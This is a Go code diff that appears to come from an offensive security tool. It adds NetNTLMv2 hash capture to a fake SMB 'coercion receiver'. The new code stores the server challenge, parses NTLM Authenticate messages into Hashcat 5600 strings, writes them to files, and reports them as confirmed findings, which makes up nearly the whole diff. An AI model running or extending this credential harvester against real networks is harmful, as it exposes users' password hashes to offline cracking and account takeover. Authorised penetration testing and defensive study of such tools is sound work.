@@ -5,10 +5,12 @@ import (
 	"context"
 	"crypto/rand"
 	"encoding/binary"
+	"encoding/hex"
 	"errors"
 	"fmt"
 	"io"
 	"net"
+	"os"
 	"sync"
 	"time"
 	"unicode/utf16"
@@ -19,6 +21,7 @@ import (
 type coercionEvent struct {
 	Time            time.Time
 	Stage, Identity string
+	Artifact        string
 }
 type coercionReceiver struct {
 	listener          net.Listener
@@ -33,6 +36,8 @@ type coercionReceiver struct {
 	diagnostics       map[string][]SMBDiagnostic
 	debug             bool
 	observeDiagnostic func(SMBDiagnostic)
+	exportDir         string
+	captureCount      int
 }
 
 func startCoercionReceiver(parent context.Context, ip string, allowed map[string]bool, diagnostics ...receiverDiagnostics) (*coercionReceiver, error) {
@@ -45,6 +50,7 @@ func startCoercionReceiver(parent context.Context, ip string, allowed map[string
 	if len(diagnostics) > 0 {
 		r.debug = diagnostics[0].debug
 		r.observeDiagnostic = diagnostics[0].observe
+		r.exportDir = diagnostics[0].exportDir
 	}
 	r.wg.Add(1)
 	go func() {
@@ -105,8 +111,10 @@ func startCoercionReceiver(parent context.Context, ip string, allowed map[string
 }
 func (r *coercionReceiver) close() { r.cancel(); r.listener.Close(); r.wg.Wait() }
 func (r *coercionReceiver) record(host, stage, identity string) {
+	r.recordEvent(host, coercionEvent{Time: time.Now(), Stage: stage, Identity: identity})
+}
+func (r *coercionReceiver) recordEvent(host string, event coercionEvent) {
 	r.mu.Lock()
-	event := coercionEvent{time.Now(), stage, identity}
 	stored := len(r.events[host]) < 256
 	if stored {
 		r.events[host] = append(r.events[host], event)
@@ -268,6 +276,7 @@ func (r *coercionReceiver) serve(ctx context.Context, c net.Conn, host string) {
 	}
 	session := le.Uint64(sessionBytes[:]) | 1
 	negotiated, challenged := false, false
+	var serverChallenge [8]byte
 	for step := 0; step < 6; step++ {
 		b, err := smbRead(c)
 		if err != nil {
@@ -379,6 +388,11 @@ func (r *coercionReceiver) serve(ctx context.Context, c net.Conn, host string) {
 					protocol("INVALID_NTLM_NEGOTIATE")
 					return
 				}
+				if len(challenge) < 32 {
+					protocol("INVALID_SERVER_CHALLENGE")
+					return
+				}
+				copy(serverChallenge[:], challenge[24:32])
 				challenge = spnegoChallenge(challenge)
 				body := make([]byte, 8)
 				le.PutUint16(body, 9)
@@ -427,6 +441,9 @@ func (r *coercionReceiver) serve(ctx context.Context, c net.Conn, host string) {
 				} else {
 					last = "AUTH_RECEIVED"
 					r.record(host, "ntlm-authenticate", identity)
+					if r.exportDir != "" {
+						r.captureNTLM(host, token, serverChallenge[:])
+					}
 				}
 				if !write(b, 1, 0xc000006d, session, []byte{9, 0, 0, 0, 0, 0, 0, 0}, "AUTH_FAILED") {
 					return
@@ -503,4 +520,105 @@ func ntlmIdentity(token []byte) (string, error) {
 		return "", fmt.Errorf("неполный NTLM Authenticate: отсутствует имя или полноценный NTLM-ответ")
 	}
 	return fmt.Sprintf("identity=%q\\%q workstation=%q (заявлено клиентом)", domain, user, workstation), nil
+}
+
+func parseNTLMv2Hash(token, serverChallenge []byte) (user, domain, hash string, err error) {
+	if len(token) < 64 || len(serverChallenge) != 8 || !bytes.Equal(token[:8], []byte("NTLMSSP\x00")) || le.Uint32(token[8:]) != 3 {
+		return "", "", "", fmt.Errorf("invalid NTLM authenticate header")
+	}
+	for _, off := range []int{20, 28, 36} {
+		n := int(le.Uint16(token[off:]))
+		p := uint64(le.Uint32(token[off+4:]))
+		if n > 0 && (p < 64 || p+uint64(n) > uint64(len(token))) {
+			return "", "", "", fmt.Errorf("NTLM security buffer outside message")
+		}
+	}
+	isUnicode := le.Uint32(token[60:])&1 != 0
+	field := func(off int) (string, error) {
+		n := int(le.Uint16(token[off:]))
+		p := int(le.Uint32(token[off+4:]))
+		if n == 0 {
+			return "", nil
+		}
+		raw := token[p : p+n]
+		if !isUnicode {
+			return string(raw), nil
+		}
+		if n%2 != 0 {
+			return "", fmt.Errorf("invalid Unicode length")
+		}
+		u := make([]uint16, n/2)
+		for i := range u {
+			u[i] = le.Uint16(raw[i*2:])
+		}
+		return string(utf16.Decode(u)), nil
+	}
+	domain, err = field(28)
+	if err != nil {
+		return "", "", "", err
+	}
+	user, err = field(36)
+	if err != nil {
+		return "", "", "", err
+	}
+	ntLen := int(le.Uint16(token[20:]))
+	ntOff := int(le.Uint32(token[24:]))
+	if user == "" || ntLen < 24 {
+		return "", "", "", fmt.Errorf("missing user or short NTLM response")
+	}
+	ntResp := token[ntOff : ntOff+ntLen]
+	proof := hex.EncodeToString(ntResp[:16])
+	blob := hex.EncodeToString(ntResp[16:])
+	chal := hex.EncodeToString(serverChallenge)
+	hash = fmt.Sprintf("%s::%s:%s:%s:%s", user, domain, chal, proof, blob)
+	return user, domain, hash, nil
+}
+
+func (r *coercionReceiver) captureNTLM(host string, token, serverChallenge []byte) {
+	_, _, hash, err := parseNTLMv2Hash(token, serverChallenge)
+	if err != nil {
+		return
+	}
+	r.mu.Lock()
+	defer r.mu.Unlock()
+	dir := r.exportDir
+	if dir == "" {
+		return
+	}
+	if err := os.MkdirAll(dir, 0700); err != nil {
+		return
+	}
+	f, err := os.CreateTemp(dir, "netntlm-*.hashcat")
+	if err != nil {
+		return
+	}
+	name := f.Name()
+	if err := f.Chmod(0600); err == nil {
+		_, _ = f.WriteString(hash + "\n")
+	}
+	_ = f.Close()
+
+	events := r.events[host]
+	for i := len(events) - 1; i >= 0; i-- {
+		if events[i].Stage == "ntlm-authenticate" {
+			r.events[host][i].Artifact = name
+			break
+		}
+	}
+	r.captureCount++
+}
+
+func appendNTLMCapture(report *AccessReport, prefix string, event coercionEvent) bool {
+	if event.Artifact == "" {
+		return false
+	}
+	id := prefix
+	name := "Coerce callback: " + event.Stage
+	if prefix == "responder" {
+		id = "responder/auth"
+		name = "Responder: " + event.Stage
+	}
+	report.add(id, name, "confirmed", "high", event.Identity+"\nХеш экспортирован для Hashcat 5600: "+event.Artifact)
+	report.Artifacts = append(report.Artifacts, event.Artifact)
+	return true
 }
